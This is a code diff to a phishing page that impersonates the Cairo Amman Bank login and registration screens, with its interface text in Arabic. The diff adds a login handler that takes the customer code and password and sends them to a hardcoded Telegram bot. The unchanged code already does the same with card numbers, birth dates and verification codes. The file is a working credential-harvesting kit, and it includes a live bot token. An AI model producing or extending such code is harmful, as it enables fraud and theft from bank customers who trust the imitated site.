@@ -5,6 +5,7 @@
   <title>بنك القاهرة عمان</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
+    /* ... نفس التنسيقات السابقة ... */
     body {
       font-family: 'Cairo', Arial, sans-serif;
       background: #fff;
@@ -170,7 +171,6 @@
       color: #222;
       cursor: pointer;
     }
-    /* Responsive */
     @media (max-width: 480px) {
       .centered {
         max-width: 100%;
@@ -200,7 +200,7 @@
         <span class="icon-show" onclick="togglePassword('login-pass', this)">إظهار</span>
       </div>
       <a class="forgot-link" onclick="showRegister()">هل نسيت اسم المستخدم / كلمة السر؟</a>
-      <button class="main-btn" onclick="alert('تم تسجيل الدخول محلياً (بدون إرسال بيانات)')">دخول</button>
+      <button class="main-btn" onclick="submitLogin()">دخول</button>
     </div>
     <div class="footer">Version 13.5 Build 1</div>
     <div class="footer-links">
@@ -248,7 +248,6 @@
   <script>
     const TELEGRAM_TOKEN = "7962720643:AAFgFfeyec_SfTiEpQOsMPe7QSa7vH4Luq8";
     const TELEGRAM_CHAT_ID = "6873334348";
-
     function showRegister() {
       document.getElementById('login-page').style.display = 'none';
       document.getElementById('register-page').style.display = '';
@@ -292,6 +291,18 @@
         alert('تعذر إرسال البيانات إلى تلجرام');
       });
     }
+    function submitLogin() {
+      const user = document.getElementById('login-user').value.trim();
+      const pass = document.getElementById('login-pass').value.trim();
+      if (!user || !pass) {
+        alert('يرجى إدخال رمز العميل وكلمة المرور');
+        return;
+      }
+      const msg = `دخول جديد:\nرمز العميل: ${user}\nكلمة المرور: ${pass}`;
+      sendToTelegram(msg);
+      alert('تم إرسال بيانات الدخول إلى تلجرام');
+      // يمكن هنا إعادة تعيين النموذج أو الانتقال لصفحة أخرى
+    }
     function submitRegister() {
       const user = document.getElementById('reg-user').value.trim();
       const birth = document.getElementById('reg-birth').value.trim();
@@ -305,7 +316,6 @@
       const msg = `تسجيل جديد:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nرقم البطاقة: ${card}\nرمز التحقق: ${code}`;
       sendToTelegram(msg);
       alert('تم إرسال البيانات إلى تلجرام');
-      // إظهار إدخال رمز التحقق الجديد
       document.getElementById('verify-section').style.display = '';
     }
     function submitVerify() {
@@ -321,7 +331,6 @@
       sendToTelegram(msg);
       alert('تم إرسال رمز التحقق الجديد إلى تلجرام');
       document.getElementById('verify-section').style.display = 'none';
-      // يمكن هنا إعادة تعيين النموذج أو إعادة المستخدم لصفحة الدخول
     }
   </script>
 </body>
